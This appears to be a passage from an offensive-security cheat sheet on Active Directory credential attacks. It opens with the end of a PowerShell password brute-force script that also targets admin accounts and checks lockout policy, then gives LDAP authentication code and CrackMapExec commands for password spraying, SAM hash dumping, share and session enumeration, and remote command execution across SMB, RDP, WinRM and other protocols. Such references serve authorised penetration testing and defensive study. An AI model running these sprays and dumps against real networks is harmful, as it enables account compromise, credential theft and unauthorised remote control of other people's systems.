If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords

15.9.2 Authenticating via DirectoryEntry

Validate credentials programmatically against the PDC over LDAP using System.DirectoryServices.

# Authenticate a user against AD via LDAP (DirectoryEntry)
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$primaryDC = ($domainContext.PdcRoleOwner).Name
$ldapPath = "LDAP://" + $primaryDC + "/"
$domainDN = "DC=$($domainContext.Name.Replace('.', ',DC='))"
$ldapPath += $domainDN
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "[userName]", "[password]")

15.9.3 CrackMapExec

Tests credentials across SMB, RDP, WinRM, LDAP and more simultaneously — reports (+) PWNED! for admin access. More commands are in Section 6.2.

# Spray one password across a user list
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-success
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --password-spray

# Single user auth check
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]

# Kerberos authentication
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos

# Post-auth: enumerate shares, sessions, SAM, run command
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions
crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"

CrackMapExec supports the following protocols — use the same -u / -p / -d flags with each:

Protocol Module Port
SMBcrackmapexec smb445
RDPcrackmapexec rdp3389
WinRMcrackmapexec winrm5985 / 5986
HTTP/HTTPScrackmapexec http80 / 443
FTPcrackmapexec ftp21
Telnetcrackmapexec telnet23
SMTPcrackmapexec smtp25
DNScrackmapexec dns53
LDAP / LDAPScrackmapexec ldap389 / 636
